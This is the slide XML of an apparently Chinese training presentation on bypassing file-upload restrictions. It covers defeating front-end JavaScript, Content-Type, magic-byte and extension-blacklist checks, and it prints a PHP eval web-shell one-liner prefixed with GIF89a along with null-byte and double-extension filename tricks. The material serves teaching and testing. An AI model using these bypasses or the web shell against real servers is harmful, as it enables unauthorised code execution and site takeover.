            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>之前，如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>抓包并未出现上传请求</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> (multipart/form-data)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，则证明是纯粹的前端</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>校验。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="文本框 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="3950335"/>
            <a:ext cx="4064000" cy="1506855"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>绕过方法：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>①直接</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>F12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>修改</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>②禁用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>③先上传被允许的文件，发包后利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>burp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>再篡改文件名与里面的内容。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="文本框 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8155940" y="1503045"/>
            <a:ext cx="1611630"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en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>MIME</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>检测</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7201535" y="2228850"/>
            <a:ext cx="4235450" cy="2030095"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>MIME </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>类型的获取一般是通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>数据包中的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Content-Type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>头部字段来完成。在文件上传过程中，浏览器或其他工具会通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> Content-Type </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>头部字段告知服务器文件的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>MIME</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>类型。因此我们可以通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>burpsuite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>修改数据包</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>content-type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>来绕过检验。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="图片 11"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7331075" y="4524375"/>
            <a:ext cx="3975735" cy="363855"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="文本框 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7331075" y="5012690"/>
            <a:ext cx="3199130" cy="583565"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just" fontAlgn="base">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>攻击者只需要修改请求包即可：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>Content-Type: image/png</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="0" i="0">
              <a:solidFill>
                <a:srgbClr val="333333"/>
              </a:solidFill>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绕过技巧</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="1503045"/>
            <a:ext cx="1748155"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>文件头验证</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="2238375"/>
            <a:ext cx="5420995" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件头验证是一种通过检查文件头部信息（即文件的前几个字节）来判断文件类型的技术。例如，当你用记事本打开一张</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>jpg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>格式的图片，会出现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FF D8 FF E0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的标识符。因而可以利用文件头验证检测出文件的真实类型。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="图片 7"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="3989705"/>
            <a:ext cx="5420995" cy="1398905"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="文本框 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6920230" y="2238375"/>
            <a:ext cx="4064000" cy="1209040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>绕过它的方式也很简单，只要在上传的文件的内容前添加一个允许的标识符即可绕过。一般来说，允许格式为图片时，添加</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GIF89a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>即可绕过。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7014210" y="3989705"/>
            <a:ext cx="4064000" cy="922020"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>例如</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>GIF89a</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>&lt;?php eval($_POST[1]); ?&gt;</a:t>
            </a:r>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绕过技巧</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="1503045"/>
            <a:ext cx="3365500"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>后缀黑名单</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>(php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>被过滤</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="2364740"/>
            <a:ext cx="10139045" cy="3415030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>①</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>双写绕过：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>通过双写为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pphphp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，使得被删除后仍组成</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>php(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>a.pphphp)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>②</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>变异文件扩展名绕过：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>很多服务器和编程语言（例如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）不仅仅支持</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> .php </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>作为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件的扩展名，还支持其他变体的扩展名，例如：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.php3 .php4 .php5 .phtml</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>③</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>大小写绕过：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>由于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>是一个对大小写敏感的操作系统，所以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>file.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>file.TXT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>会被视作两个不同的文件，在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>win</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>则会视作两个相同的文件。对于某些区分大小写的系统，可采用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shell.PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shell.pHp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>绕过</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>④</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>截断：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>利用字符串终止符（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>空字节，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>\x00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）绕过文件上传中的扩展名检查或路径处理漏洞。例如，可以构造一个文件名为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> shell.php\x00.jpg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。如果后端代码在处理文件名时，遇到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> \x00 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>截断符，那么服务器会将文件名解析为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> shell.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，但系统认为它是一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> .jpg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件，从而允许文件上传。</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绕过技巧</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="1503045"/>
            <a:ext cx="2092325"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>配置文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
